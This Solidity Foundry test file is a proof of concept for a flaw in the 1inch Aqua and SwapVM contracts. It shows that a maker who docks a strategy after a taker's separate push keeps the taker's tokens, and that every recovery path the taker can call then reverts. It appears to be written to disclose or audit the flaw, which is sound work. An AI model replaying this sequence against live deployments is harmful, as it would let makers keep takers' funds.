// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { Test } from "forge-std/Test.sol";

import { TokenMock } from "@1inch/solidity-utils/contracts/mocks/TokenMock.sol";

import { Aqua } from "@1inch/aqua/src/Aqua.sol";
import { IAqua } from "@1inch/aqua/src/interfaces/IAqua.sol";

import { ISwapVM } from "swap-vm/contracts/interfaces/ISwapVM.sol";
import { AquaSwapVMRouter } from "swap-vm/contracts/routers/AquaSwapVMRouter.sol";
import { MakerTraitsLib } from "swap-vm/contracts/libs/MakerTraits.sol";
import { TakerTraitsLib } from "swap-vm/contracts/libs/TakerTraits.sol";
import { XYCSwap } from "swap-vm/contracts/instructions/XYCSwap.sol";

/// @notice PoC: a permissionless Aqua.push credits only the maker-keyed virtual
///  balance while moving real tokens to the maker wallet; a maker-only dock
///  then zeroes every virtual slot to 0xFF without moving anything back.
///  A taker whose separate-tx push lands before the dock keeps no taker-callable
///  path to its tokens: the paired swap reverts at safeBalances, and every
///  direct recovery attempt reverts on the pinned sources.
/// @dev Control first: the same order + program + taker traits complete a swap
///  when the strategy is still active, so the post-dock revert is caused by the
///  dock, not by a malformed order. The paired swap uses the protocol's
///  transferFrom-and-push settlement leg (the router pushes amountIn during the
///  swap); the victim's separate-tx pre-push sits in the strategy credit on top.
contract AquaDockPoC is Test {
    uint256 constant INITIAL_BALANCE_A = 1000e18;
    uint256 constant INITIAL_BALANCE_B = 2000e18;
    uint256 constant PUSH_AMOUNT = 100e18;

    Aqua public aqua;
    AquaSwapVMRouter public router;
    TokenMock public tokenA;
    TokenMock public tokenB;

    address public maker = vm.addr(0x1234);
    address public taker = vm.addr(0x5678);
    address public routerOwner = vm.addr(0x9999);

    ISwapVM.Order internal order;
    bytes32 internal orderHash;

    function setUp() public {
        aqua = new Aqua();
        tokenA = new TokenMock("Token A", "TKA");
        tokenB = new TokenMock("Token B", "TKB");
        if (address(tokenA) > address(tokenB)) (tokenA, tokenB) = (tokenB, tokenA);

        router = new AquaSwapVMRouter(address(aqua), address(0), routerOwner, "SwapVM", "1.0.0");

        order = MakerTraitsLib.build(MakerTraitsLib.Args({
            maker: maker,
            receiver: address(0),
            tokenA: address(tokenA),
            tokenB: address(tokenB),
            shouldUnwrapWeth: false,
            useAquaInsteadOfSignature: true,
            allowZeroAmountIn: false,
            usePermit2: false,
            hasPreTransferInHook: false,
            hasPostTransferInHook: false,
            hasPreTransferOutHook: false,
            hasPostTransferOutHook: false,
            preTransferInTarget: address(0),
            preTransferInData: "",
            postTransferInTarget: address(0),
            postTransferInData: "",
            preTransferOutTarget: address(0),
            preTransferOutData: "",
            postTransferOutTarget: address(0),
            postTransferOutData: "",
            program: XYCSwap.build()
        }));
        orderHash = router.hash(order);

        tokenA.mint(maker, INITIAL_BALANCE_A);
        tokenB.mint(maker, INITIAL_BALANCE_B);
        tokenA.mint(taker, 2 * PUSH_AMOUNT);

        vm.prank(maker);
        tokenA.approve(address(aqua), type(uint256).max);
        vm.prank(maker);
        tokenB.approve(address(aqua), type(uint256).max);
        vm.prank(taker);
        tokenA.approve(address(aqua), type(uint256).max);
        vm.prank(taker);
        tokenA.approve(address(router), type(uint256).max);
    }

    /// @dev Taker traits for an exact-in A->B fill settled through the router's
    ///  transferFrom-and-push leg. Mirrors the protocol's supported settlement
    ///  path; the taker's separate-tx pre-push is credit on top.
    function _fillTakerTraits() internal view returns (bytes memory) {
        return TakerTraitsLib.build(TakerTraitsLib.Args({
            taker: taker,
            isExactIn: true,
            shouldUnwrapWeth: false,
            isStrictThresholdAmount: false,
            isFirstTransferFromTaker: false,
            useTransferFromAndAquaPush: true,
            isAToB: true,
            allowPartialFill: false,
            usePermit2: false,
            threshold: "",
            to: address(0),
            deadline: 0,
            hasPreTransferInCallback: false,
            hasPreTransferOutCallback: false,
            preTransferInHookData: "",
            postTransferInHookData: "",
            preTransferOutHookData: "",
            postTransferOutHookData: "",
            preTransferInCallbackData: "",
            preTransferOutCallbackData: "",
            instructionsArgs: "",
            signature: ""
        }));
    }

    function _ship() internal {
        vm.prank(maker);
        bytes32 strategyHash = aqua.ship(
            address(router),
            abi.encode(order),
            _tokens(),
            _amounts(INITIAL_BALANCE_A, INITIAL_BALANCE_B)
        );
        assertEq(strategyHash, orderHash, "strategy must hash to the order hash");
    }

    function _tokens() internal view returns (address[] memory tokens) {
        tokens = new address[](2);
        tokens[0] = address(tokenA);
        tokens[1] = address(tokenB);
    }

    function _amounts(uint256 a, uint256 b) internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](2);
        amounts[0] = a;
        amounts[1] = b;
    }

    /// @notice Control: the order, program, and traits are valid; the same fill
    ///  completes while the strategy is active, even with a pre-push on top.
    function test_Control_FillSucceedsBeforeDock() public {
        _ship();

        // Taker pre-pushes tokenIn via a separate tx while the strategy is active.
        vm.prank(taker);
        aqua.push(maker, address(router), orderHash, address(tokenA), PUSH_AMOUNT);

        (uint256 balanceIn,) = aqua.rawBalances(maker, address(router), orderHash, address(tokenA));
        assertEq(balanceIn, INITIAL_BALANCE_A + PUSH_AMOUNT, "push credits maker virtual balance");
        assertEq(tokenA.balanceOf(maker), INITIAL_BALANCE_A + PUSH_AMOUNT, "push moves real tokens to maker");

        // The paired fill settles against the active strategy.
        vm.prank(taker);
        (uint256 amountIn, uint256 amountOut,) = router.swap(order, PUSH_AMOUNT, _fillTakerTraits());
        assertEq(amountIn, PUSH_AMOUNT, "exact-in amount");
        assertGt(amountOut, 0, "fill produced tokenOut for taker");
        assertEq(tokenB.balanceOf(taker), amountOut, "taker receives tokenOut");
    }

    /// @notice Attack: taker pre-pushes X via a separate tx, the maker docks the
    ///  full token list, the paired fill reverts, and X stays in the maker wallet
    ///  with no taker-callable recovery.
    function test_DockAfterTakerPush_StrandsPushedTokens() public {
        _ship();

        // Tx 2 (taker): permissionless push of real tokenIn to the maker wallet.
        vm.prank(taker);
        aqua.push(maker, address(router), orderHash, address(tokenA), PUSH_AMOUNT);

        // Tx 3 (maker): dock the full token list; real tokens do not move back.
        vm.prank(maker);
        aqua.dock(address(router), orderHash, _tokens());

        // Virtual credit is wiped to 0xFF on both slots.
        (uint256 balA, uint8 countA) = aqua.rawBalances(maker, address(router), orderHash, address(tokenA));
        (uint256 balB, uint8 countB) = aqua.rawBalances(maker, address(router), orderHash, address(tokenB));
        assertEq(balA, 0, "docked balance A");
        assertEq(uint256(countA), 255, "docked marker A");
        assertEq(balB, 0, "docked balance B");
        assertEq(uint256(countB), 255, "docked marker B");

        // Tx 4 (taker): the paired fill reverts at safeBalances, before the
        // router touches any of the taker's remaining tokens.
        vm.prank(taker);
        vm.expectRevert(
            abi.encodeWithSelector(
                IAqua.SafeBalancesForTokenNotInActiveStrategy.selector,
                maker, address(router), orderHash, address(tokenA)
            )
        );
        router.swap(order, PUSH_AMOUNT, _fillTakerTraits());

        // Measured balances: the taker kept its unpushed fill funds, the pushed
        // X sits in the maker wallet, and no tokenOut was delivered.
        assertEq(tokenA.balanceOf(taker), PUSH_AMOUNT, "taker kept fill funds; pre-pushed X is gone");
        assertEq(tokenA.balanceOf(maker), INITIAL_BALANCE_A + PUSH_AMOUNT, "maker wallet holds taker X");
        assertEq(tokenB.balanceOf(taker), 0, "taker received no tokenOut");
        assertEq(tokenA.balanceOf(address(router)), 0, "router holds nothing to rescue");
    }

    /// @notice Recovery enumeration post-dock: every taker-callable path reverts.
    function test_DockAfterTakerPush_NoTakerRecoveryPath() public {
        _ship();

        vm.prank(taker);
        aqua.push(maker, address(router), orderHash, address(tokenA), PUSH_AMOUNT);
        vm.prank(maker);
        aqua.dock(address(router), orderHash, _tokens());

        bytes memory fillTraits = _fillTakerTraits();

        // 1. Retry the paired fill.
        vm.prank(taker);
        vm.expectRevert(
            abi.encodeWithSelector(
                IAqua.SafeBalancesForTokenNotInActiveStrategy.selector,
                maker, address(router), orderHash, address(tokenA)
            )
        );
        router.swap(order, PUSH_AMOUNT, fillTraits);

        // 2. Quote the same order.
        vm.prank(taker);
        vm.expectRevert(
            abi.encodeWithSelector(
                IAqua.SafeBalancesForTokenNotInActiveStrategy.selector,
                maker, address(router), orderHash, address(tokenA)
            )
        );
        router.quote(order, PUSH_AMOUNT, fillTraits);

        // 3. Register the aqua order.
        vm.prank(taker);
        vm.expectRevert(
            abi.encodeWithSelector(
                IAqua.SafeBalancesForTokenNotInActiveStrategy.selector,
                maker, address(router), orderHash, address(tokenA)
            )
        );
        router.registerOrder(order, "");

        // 4. Push again into the wiped strategy.
        vm.prank(taker);
        vm.expectRevert(
            abi.encodeWithSelector(
                IAqua.PushToNonActiveStrategyPrevented.selector,
                maker, address(router), orderHash, address(tokenA)
            )
        );
        aqua.push(maker, address(router), orderHash, address(tokenA), 1);

        // 5. Pull the credit directly: the taker is not the app, so its own
        //  app-namespace slot is empty and the subtraction underflows. pull
        //  performs no tokensCount check at all.
        vm.prank(taker);
        vm.expectRevert();
        aqua.pull(maker, orderHash, address(tokenA), PUSH_AMOUNT, taker);

        // 6. Even a cooperative maker cannot re-ship the dead strategy, so the
        //  strategy can never be revived for a later fill.
        vm.prank(maker);
        vm.expectRevert(
            abi.encodeWithSelector(IAqua.StrategiesMustBeImmutable.selector, address(router), orderHash)
        );
        aqua.ship(address(router), abi.encode(order), _tokens(), _amounts(uint256(1), uint256(1)));

        // 7. Re-docking is rejected: tokensCount is 0xFF, not the token list length.
        vm.prank(maker);
        vm.expectRevert(
            abi.encodeWithSelector(IAqua.DockingShouldCloseAllTokens.selector, address(router), orderHash)
        );
        aqua.dock(address(router), orderHash, _tokens());

        // 8. Router rescue cannot reach the maker wallet: the router holds none
        //  of tokenA, so rescuing the stranded X reverts.
        assertEq(tokenA.balanceOf(address(router)), 0, "router holds no tokenA");
        vm.prank(routerOwner);
        vm.expectRevert();
        router.rescueFunds(tokenA, PUSH_AMOUNT);

        // End state unchanged: the taker's X is still in the maker wallet.
        assertEq(tokenA.balanceOf(taker), PUSH_AMOUNT, "taker still out its pushed X");
        assertEq(tokenA.balanceOf(maker), INITIAL_BALANCE_A + PUSH_AMOUNT, "maker wallet still holds taker X");
    }
}
